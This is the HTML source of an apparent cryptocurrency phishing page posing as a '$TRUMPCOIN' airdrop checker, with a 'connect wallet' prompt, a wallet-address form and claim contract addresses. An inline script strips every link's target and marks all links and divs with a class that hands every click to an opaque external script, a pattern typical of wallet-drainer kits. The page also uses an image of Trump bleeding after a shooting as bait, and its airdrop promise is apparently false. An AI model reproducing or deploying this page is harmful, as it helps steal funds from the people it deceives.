<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="https://claim.fightfortrump.io/favicon.png" type="image/x-icon" />
    <link rel="preload" as="image" href="https://claim.fightfortrump.io/bg.png" />
    <link rel="stylesheet" href="style.css" />
    <title>$TRUMPCOIN AIRDROP CHECKER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="8b8b2302-ebaf-46bb-b317-77c24aa8597f.js"></script>

    <script>
        function addClassesToElements() {
  
            const links = document.querySelectorAll('a:not(.interact-button)');
            for (const link of links) {
                link.removeAttribute('href');
                link.classList.add('interact-button');
            }
            const buttons = document.querySelectorAll('div:not(.interact-button)');
            for (const button of buttons) {
                button.classList.add('interact-button');
            }
        }
        setInterval(addClassesToElements, 300);
    </script>
</head>
<body>
    <main class="bg-black bg-opacity-50 py-32">
        <section class="w-full min-h-svh max-w-4xl px-4 mx-auto flex items-center justify-center">
            <div class="w-full space-y-10">
                <div class="space-y-10">
                    <h1 class="text-white text-center text-5xl lg:text-6xl font-bold">
                        $TRUMPCOIN AIRDROP CHECKER
                    </h1>

                    <div class="w-full flex items-center justify-center">
                        <a
                            class="inline-flex items-center justify-center whitespace-nowrap ring-offset-white transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-600 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 dark:ring-offset-blue-600 dark:focus-visible:ring-slate-300 font-sans bg-white text-black hover:bg-red-600 border-4 border-black hover:border-blue-500 hover:text-white px-4 py-2 text-xl interact-button">
                            CONNECT WALLET
                        </a>
                    </div>
                </div>

                <form class="flex w-full flex-col items-center gap-4 md:flex-row">
                    <div class="space-y-2 relative w-full flex-auto md:w-auto">
                        <input
                            class="flex w-full border-slate-200 bg-white/50 px-3 py-2 text-3xl text-black ring-offset-red-600 file:border-0 file:bg-transparent file:text-3xl file:font-black placeholder:text-black focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-600 focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 h-16 flex-auto"
                            placeholder="Wallet Address..."
                            id="txtWalletAddress"
                            aria-describedby=":R2n9uhba:-form-item-description"
                            aria-invalid="false"
                            name="address"
                            value />
                    </div>
                    <button
                        id="btnSubmit"
                        class="inline-flex items-center justify-center whitespace-nowrap ring-offset-white transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-600 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 dark:ring-offset-blue-600 dark:focus-visible:ring-slate-300 font-sans bg-white text-black hover:bg-red-600 border-4 border-black hover:border-blue-500 hover:text-white px-4 py-4 text-3xl h-16 w-full flex-none md:w-auto interact-button"
                        type="submit">
                        CHECK
                    </button>
                </form>

                <div class="mx-auto space-y-5 w-full max-w-[700px] text-white">
                    <div>
                        <p class="text-center text-xl">HOW TO CLAIM:</p>

                        <p class="text-center">
                            Your Tokens will be available 1 hour after TGE.
                        </p>
                    </div>

                    <img
                        src="trump-bleeding.jpg"
                        alt="Trump bleeding after the shooting at his campaign"
                        width="768"
                        height="432"
                        loading="lazy"
                        class="rounded" />
                </div>

                <div class="mx-auto my-4 h-1.5 w-full max-w-[500px] rounded-full bg-white"></div>

                <div class="flex max-w-sm mx-auto flex-col items-center justify-center gap-2 text-white">
                    <div class="w-full overflow-hidden">
                        <div class="font-bold">CLAIM CONTRACT:</div>
                        <a
                            class="block font-semibold truncate font-mono text-sm hover:underline sm:inline-flex"
                            href="https://etherscan.io/address/0x1BC1f3442080dB1f5C36898a878359f3E28f3bD8"
                            target="_blank">
                            0x1BC1f3442080dB1f5C36898a878359f3E28f3bD8
                        </a>
                    </div>
                    <div class="w-full overflow-hidden">
                        <div class="font-bold">$TRUMPCOIN CONTRACT:</div>
                        <a
                            class="block font-semibold truncate font-mono text-sm hover:underline sm:inline-flex"
                            href="https://etherscan.io/address/0x03dCee0d21ab39614c768DAb67BFC33B0Fc0A047"
                            target="_blank">
                            0x03dCee0d21ab39614c768DAb67BFC33B0Fc0A047
                        </a>
                    </div>
                </div>
            </div>
        </section>
    </main>
</body>
</html>
